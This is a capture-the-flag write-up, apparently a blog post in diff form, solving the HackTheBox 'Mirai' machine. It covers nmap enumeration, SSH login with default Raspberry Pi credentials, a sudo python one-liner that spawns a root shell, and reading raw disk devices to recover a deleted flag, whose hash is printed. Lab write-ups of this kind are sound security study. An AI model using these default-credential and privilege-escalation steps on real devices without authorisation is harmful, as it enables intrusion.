@@ -1,0 +1,78 @@
+---
+layout: post
+title:  "HackTheBox - Mirai"
+date:   2021-08-06 17:06:25
+categories: Pentesting
+---
+
+# ENUMERATION
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
+|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
+|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
+|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
+53/tcp open  domain  dnsmasq 2.76
+| dns-nsid: 
+|_  bind.version: dnsmasq-2.76
+80/tcp open  http    lighttpd 1.4.35
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+# FOOTHOLD
+
+Visiting /admin on port 80 we see its a raspberry-pi login console. Googling gives us default creds of raspberry pi user:
+[ssh connect](https://howchoo.com/g/mgi3mdnlnjq/how-to-log-in-to-a-raspberry-pi-via-ssh)
+
+Now we can log in and grab user.txt from /home/pi/user.txt
+
+# PRIVILEGE ESCALATION
+
+Running sudo -l shows us we can run any command so I run my python command:
+
+```s
+pi@raspberrypi:~ $ sudo -l
+Matching Defaults entries for pi on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User pi may run the following commands on localhost:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+
+pi@raspberrypi:~ $ sudo python -c 'import os; os.system("/bin/sh")'
+# whoami
+root
+```
+However root.txt in root directory doesn't have the root flag.It just has this:
+```s
+root@raspberrypi:~# cat root.txt 
+I lost my original root.txt! I think I may have a backup on my USB stick...
+```
+Googling I find out that external drives and devices info are stored in /dev directory in sda1,sda2,sdb,etc
+
+So I just did this:
+```
+cat /dev/sd*
+```
+And in the middle of the now absolutely destroyed terminal I see this:
+```s
+�+ �!9��;9�Y�3
+              8PP
+(["�      �1�Y��S��1�Y
+                      �<Byc[��B)�>r &�<�yZ�.Gu���m^��>
+                                                      �1�Y
+�|}*,.������+-���3d3e483143ff12ec505d026fa13e020b
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know if there is any way to get them back?
+
+-James
+```
+And thats our root flag :)
